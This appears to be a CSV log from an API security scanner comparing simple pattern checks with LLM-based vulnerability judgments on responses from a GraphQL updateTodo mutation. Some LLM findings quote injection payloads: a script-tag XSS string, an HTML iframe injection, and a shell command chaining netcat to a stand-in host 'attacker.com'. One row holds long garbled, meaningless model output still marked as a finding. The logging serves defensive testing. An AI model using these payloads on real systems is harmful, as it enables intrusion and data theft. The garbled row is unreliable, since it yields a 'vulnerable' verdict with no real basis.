timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-09-27T16:52:44.339024,updateTodo_response_2,200,1,0,0.0,simple_only,,Injection Attacks,,0,1,0,0,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]",[]
2025-09-27T16:53:43.882872,updateTodo_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response body shows a script tag payload (\""<script>alert(123)</script>\"") reflected unmodified in the 'title' field of the updateTodo mutation output. This indicates the API is neither sanitizing nor escaping user-supplied input before storage or reflection. While the vulnerability manifests client-side, this evidence confirms the server returns raw malicious scripts, enabling stored XSS attacks when this content is rendered in a web context without additional sanitization. This meets XSS detection criteria (script tags present in returned content)."", ""evidence"": ""title field contains \""<script>alert(123)</script>\"" payload"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""HIGH"", ""confidence"": 0.95, ""evidence"": ""title field contains \""<script>alert(123)</script>\"" payload"", ""explanation"": ""The response body shows a script tag payload (\""<script>alert(123)</script>\"") reflected unmodified in the 'title' field of the updateTodo mutation output. This indicates the API is neither sanitizing nor escaping user-supplied input before storage or reflection. While the vulnerability manifests client-side, this evidence confirms the server returns raw malicious scripts, enabling stored XSS attacks when this content is rendered in a web context without additional sanitization. This meets XSS detection criteria (script tags present in returned content).""}}]"
2025-09-27T16:54:41.574068,updateTodo_response_4,200,1,0,0.0,simple_only,,Injection Attacks,,0,1,0,0,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Server-Side Request Forgery (SSRF) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SSRF injection vulnerability detected - internal network access patterns found"", ""evidence"": ""Response status: 200, SSRF keywords detected in response""}]",[]
2025-09-27T16:56:03.268615,updateTodo_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response shows a GraphQL mutation (updateTodo) where the 'title' field contains a suspicious payload with shell command sequences. The semicolon (;) acts as a command separator, followed by a pipe (|) to netcat (nc), which attempts to send data to an external attacker-controlled server. This pattern is characteristic of OS command injection testing payloads. While the response doesn't show command output, the acceptance and storage of this payload without sanitization indicates the server likely executed the command. The payload's structure (command chaining, external network call) combined with GraphQL's mutation context (data modification operation) provides strong evidence of vulnerability."", ""evidence"": ""The 'title' field contains payload: \""test; echo 'malicious' | nc attacker.com 4444;\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""The 'title' field contains payload: \""test; echo 'malicious' | nc attacker.com 4444;\"""", ""explanation"": ""The response shows a GraphQL mutation (updateTodo) where the 'title' field contains a suspicious payload with shell command sequences. The semicolon (;) acts as a command separator, followed by a pipe (|) to netcat (nc), which attempts to send data to an external attacker-controlled server. This pattern is characteristic of OS command injection testing payloads. While the response doesn't show command output, the acceptance and storage of this payload without sanitization indicates the server likely executed the command. The payload's structure (command chaining, external network call) combined with GraphQL's mutation context (data modification operation) provides strong evidence of vulnerability.""}}]"
2025-09-27T16:59:07.909989,updateTodo_response_6,200,1,0,0.0,simple_only,,Injection Attacks,,0,1,0,0,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""Path injection vulnerability detected - file system access patterns found"", ""evidence"": ""Response status: 200, Path injection patterns detected in response""}]",[]
2025-09-27T16:59:42.383856,updateTodo_response_7,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""HTML Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""HTML injection vulnerability detected - HTML markup found in response"", ""evidence"": ""Response status: 200, HTML patterns detected in response data""}]","[{""detection_name"": ""LLM: html_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains unsanitized HTML tags (<h1> and <iframe>) in the 'title' field. This indicates user-supplied HTML is stored and returned without proper sanitization. When rendered in a browser, this would execute the HTML markup, demonstrating a clear HTML injection vulnerability that could lead to XSS attacks."", ""evidence"": ""title field contains: <h1>Hacked</h1><iframe src='malicious.com'>"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""HIGH"", ""confidence"": 0.95, ""evidence"": ""title field contains: <h1>Hacked</h1><iframe src='malicious.com'>"", ""explanation"": ""The response contains unsanitized HTML tags (<h1> and <iframe>) in the 'title' field. This indicates user-supplied HTML is stored and returned without proper sanitization. When rendered in a browser, this would execute the HTML markup, demonstrating a clear HTML injection vulnerability that could lead to XSS attacks.""}}]"
2025-09-27T17:00:32.598547,updateTodo_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-09-27T17:01:03.385819,updateTodo_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-09-27T17:10:34.729151,updateTodo_response_10,400,0,1,0.0,llm_only,,,Unknown,0,0,0,0,1,0,0.0,llm_potential_only,,,Unknown,[],"[{""detection_name"": ""LLM: unknown"", ""detection"": ""potential"", ""category"": ""Unknown"", ""description"": ""a have how gives it to They is as me viaWe ut me the have we for to moreolve Mutation me for such matter me\\nmu me mean? make?\n\n high meanove message me need meaning into the to? have? thatql to including if that aroundme and as: is partly for}\n\n to \""?? make and message such?\n\n it happens even has and me\n\nme is we how if mean something - think meThe message the that need that mean me meanme\u307f something mean? mean calculate that matter mix making would me andQL means for meaning withme what meanmeQL? that earlier me is mean mean that is mean me and meanQL but me me a meanwhileQL that met meanQLQL have mean thoseifyme seehowever and makes me flow MeQLmm and a howme need to me cause of make: that me and equ it measure it We\n\nqlme?\n\n weThisQLs.net me with modify whememe is me means the gem to memu andquire of indicates me means weg in the\n\nmeQLQL becauseveme me\n\n or me the andve machme moremg me me haveQfty e that me \n\n meway means q have me how this so for?\n\n me hasQL? mean?\n\n anything does for me for##QLQL see for to?\n\n anyone and theQL?? does me? change something make they\n\n me\u03a6?? make me we a Message because me\n\n mo it does gives manage for mL For with add roughly wheQL that meQLQL me me meQL if me and meaningQL me me through me me She\\While: m me\n\n me\u00ff mean\n\n more meqlme mean does a mode message to? provide so flow mean because gHow\n\n make?\n gives that me efum?? ev andmeaning of for unique mean me sense madewnmean for see mee something and  means me? meQL and meanmean again that e\n how me me? happen? me mean meaning me me to??\n am did\n\n toief gave to so a make me that thing what How happened a me been see meaning: made it soQL me\n\n for: with me for to doubt whatsoever though makesify of gave due me that\\xQ meant how.f f\u0fb1 which something is, bum/fum/m \n\n som want~\\n cum thelm a sin as?\\m makeup is tishm and sansp do smne factouf1+f an i??? day dum itu b \num a dum something\n\n \ne uma sihmom isum mn halluc of sm andmss bis so.\n\n, must doth not humumu To\n\nsoum sowe doth and error mean sole dum\n\nn fiction\n\n? dum mo because[c final something as,vomiso whichme that / here dol what \n\nfs not nil involved to    sentence dud me\n\ni so the something s have is used is behold-sh theme null ( does something for me means</think>not do do To?:\n?: Title And_m Mu\n MeMeanne Within HaveIs What In_f Like _\n</think>,wgemme elif\u0645rym fe as:\n_method_msg\n_tona\n\n -me\n\nMrsy\n\n_value_b with_kwhich\n_f queen is\nAny standard\n\n Given;\nW makes an themax key\n_fO __fstep\n -__s_f -\n _ is_fism_b__f_of_f-key\n vulnerability991{voc\n_ introductionreference_of_' _ comments _b_ _meaning _ :-check_ key_null\n_ The_f_b _null __th000iam_of_line \\\nbox_m_path =_contextsbb_Mir _-_B_id (\n_m _This\n\n\ncan to _ness_f\n _\n_f _ d \n_is\""...let buffer this \n =_argument_ Field _B _bbB## difference shape key of\n\n\n false webut is _"", ""evidence"": ""Found vulnerability indicators in response"", ""confidence"": 0.3, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""unknown"", ""severity"": ""MEDIUM"", ""confidence"": 0.3, ""evidence"": ""Found vulnerability indicators in response"", ""explanation"": ""a have how gives it to They is as me viaWe ut me the have we for to moreolve Mutation me for such matter me\\nmu me mean? make?\n\n high meanove message me need meaning into the to? have? thatql to including if that aroundme and as: is partly for}\n\n to \""?? make and message such?\n\n it happens even has and me\n\nme is we how if mean something - think meThe message the that need that mean me meanme\u307f something mean? mean calculate that matter mix making would me andQL means for meaning withme what meanmeQL? that earlier me is mean mean that is mean me and meanQL but me me a meanwhileQL that met meanQLQL have mean thoseifyme seehowever and makes me flow MeQLmm and a howme need to me cause of make: that me and equ it measure it We\n\nqlme?\n\n weThisQLs.net me with modify whememe is me means the gem to memu andquire of indicates me means weg in the\n\nmeQLQL becauseveme me\n\n or me the andve machme moremg me me haveQfty e that me \n\n meway means q have me how this so for?\n\n me hasQL? mean?\n\n anything does for me for##QLQL see for to?\n\n anyone and theQL?? does me? change something make they\n\n me\u03a6?? make me we a Message because me\n\n mo it does gives manage for mL For with add roughly wheQL that meQLQL me me meQL if me and meaningQL me me through me me She\\While: m me\n\n me\u00ff mean\n\n more meqlme mean does a mode message to? provide so flow mean because gHow\n\n make?\n gives that me efum?? ev andmeaning of for unique mean me sense madewnmean for see mee something and  means me? meQL and meanmean again that e\n how me me? happen? me mean meaning me me to??\n am did\n\n toief gave to so a make me that thing what How happened a me been see meaning: made it soQL me\n\n for: with me for to doubt whatsoever though makesify of gave due me that\\xQ meant how.f f\u0fb1 which something is, bum/fum/m \n\n som want~\\n cum thelm a sin as?\\m makeup is tishm and sansp do smne factouf1+f an i??? day dum itu b \num a dum something\n\n \ne uma sihmom isum mn halluc of sm andmss bis so.\n\n, must doth not humumu To\n\nsoum sowe doth and error mean sole dum\n\nn fiction\n\n? dum mo because[c final something as,vomiso whichme that / here dol what \n\nfs not nil involved to    sentence dud me\n\ni so the something s have is used is behold-sh theme null ( does something for me means</think>not do do To?:\n?: Title And_m Mu\n MeMeanne Within HaveIs What In_f Like _\n</think>,wgemme elif\u0645rym fe as:\n_method_msg\n_tona\n\n -me\n\nMrsy\n\n_value_b with_kwhich\n_f queen is\nAny standard\n\n Given;\nW makes an themax key\n_fO __fstep\n -__s_f -\n _ is_fism_b__f_of_f-key\n vulnerability991{voc\n_ introductionreference_of_' _ comments _b_ _meaning _ :-check_ key_null\n_ The_f_b _null __th000iam_of_line \\\nbox_m_path =_contextsbb_Mir _-_B_id (\n_m _This\n\n\ncan to _ness_f\n _\n_f _ d \n_is\""...let buffer this \n =_argument_ Field _B _bbB## difference shape key of\n\n\n false webut is _""}}]"
2025-09-27T17:12:23.607099,updateTodo_response_11,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
